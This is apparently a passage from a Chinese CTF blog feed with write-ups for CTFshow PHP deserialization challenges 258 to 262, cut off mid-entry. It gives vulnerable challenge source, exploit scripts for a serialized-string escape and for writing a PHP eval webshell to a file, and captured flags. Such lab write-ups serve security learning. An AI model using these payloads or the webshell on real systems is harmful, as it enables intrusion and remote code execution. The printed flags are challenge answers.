class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;d3cb7439-b92b-<span class="number">490</span>d-a609-c65c9977bc04&#125;</span><br></pre></td></tr></table></figure><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>这题难度适中，最重要的就是要知道 session 的写入方式才能找到利用的地方。我也是花费大量时间的查询博客后才了解、学习到这部分的知识。学习总是枯燥的，但是最终做出来题目时，心情是无比欢快的，这也是学习的意义。希望大家一起进步。以上文章有不足、错误的地方欢迎大家留言指出。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-8</title>
      <link href="/2023/06/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-8/"/>
      <url>/2023/06/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-8/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-262"><a href="#题目来源：CTFshow-web入门-php反序列化-262" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-262"></a>题目来源：CTFshow web入门-php反序列化-262</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message.php下</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析题目，在php反序列化中，如果出现了 str_replace() 函数，大概率时考察字符串逃逸。题目的 str_replace() 函数会将 “fuck” 替换成 “loveU” 。从4个字符替换成了5个字符，则知晓是字符串的增加，一次可以逃逸1个字符。打开题目给的message.php网页，发现只要类中的 $token 的值为 admin ,则就输出 flag 。那么就先开始构造我们的目标序列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:3:&quot;</span>msg<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:2:&quot;</span>to<span class="string">&quot;;s:1:&quot;</span>c<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>统共是62个字符，一次逃逸1个字符，那么总共需要逃逸62次，也就是需要62个 “fuck” ，构造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">subai</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>获得我们的经过base64后的配料，将其写入 cookie 中，即可获得 flag：</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-8/01.png"></p><p>flag:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;fff30e0b-<span class="number">02</span>fb-<span class="number">4870</span>-b26f-b3852bc2c924&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-7</title>
      <link href="/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-7/"/>
      <url>/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-7/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-261"><a href="#题目来源：CTFshow-web入门-php反序列化-261" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-261"></a>题目来源：CTFshow web入门-php反序列化-261</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看题目，发现大量魔术方法，尽管很罗嗦，但是还是复习一下魔术方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()，类的构造函数,在实例化一个对象时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()，类的析构函数，在对象被摧毁时调用，也就是反序列化之后</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()，当对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()，当对不可访问属性调用<span class="keyword">unset</span>()时被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()，执行<span class="title function_ invoke__">serialize</span>()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()，执行<span class="title function_ invoke__">unserialize</span>()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set_state</span>()，调用<span class="title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()，打印所需调试信息</span><br></pre></td></tr></table></figure><p>这一题有一个知识点，在php7.4以上版本时，当出现 __unserialize() 魔术方法时，会自动绕过 wakeup() 魔术方法，不会执行。因此，这题只用看类的构析函数即可。看到题目的 invoke() 魔术方法中存在 eval() 漏洞函数，但是程序执行不到那个地步，因此它时一个干扰信息。真正有用的是 destruct() 里面的 file_put_contents() 函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>()  </span><br><span class="line"></span><br><span class="line"><span class="comment">#写入文件：file_put_contents() 函数可以将指定的数据写入到文件中。可以是字符串、数组或二进制数据。文件路径：函数的第一个参数是要写入的文件路径。这可以是相对路径或绝对路径，用于指定要写入数据的文件。数据内容：作为第二个参数，你可以提供要写入文件的数据内容。可以是字符串、数组或二进制数据。返回结果：函数将返回写入文件的字节数。如果写入失败，返回 false。</span></span><br></pre></td></tr></table></figure><p>我们可以利用这个函数向指定文件中写入恶意代码实现管理文件。</p><p>题中还给出，若 code 弱等于 0x36d (这是16进制，十进制为 877) 并且最重要的是，没有将其加上引号，因此，它会被当做数字来处理，而不是字符串，所以我们传入 877.php 与 code 比较值为真。不管后面的字符有多少，最终都会转为 877。</p><p>据此开始构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$p</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;877.php&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>()))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将其值传入到 vip 中 ，在切换到 877.php 利用一句话木马，即可获取flag</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-7/01.png"></p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-7/02.png"></p><p>获得flag:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;<span class="number">268</span>d2338-<span class="number">38</span>a5-<span class="number">473</span>c-a681-c3f95084286c&#125; </span><br></pre></td></tr></table></figure><p>这题也比较简单，主要是对魔术方法的判断。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-6</title>
      <link href="/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-6/"/>
      <url>/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-6/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-260"><a href="#题目来源：CTFshow-web入门-php反序列化-260" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-260"></a>题目来源：CTFshow web入门-php反序列化-260</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析题目，只要传入值为 ctfshow_i_love_36D 的参数就可以得到flag，异常简单。</p><p>flag:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;<span class="number">725</span>f9855-<span class="number">5</span>fb4-<span class="number">47</span>d7-b037-<span class="number">11</span>f4ed192705&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-5</title>
      <link href="/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-5/"/>
      <url>/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-5/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源-CTFshow-web入门-php反序列化-258"><a href="#题目来源-CTFshow-web入门-php反序列化-258" class="headerlink" title="题目来源;CTFshow web入门-php反序列化-258"></a>题目来源;CTFshow web入门-php反序列化-258</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    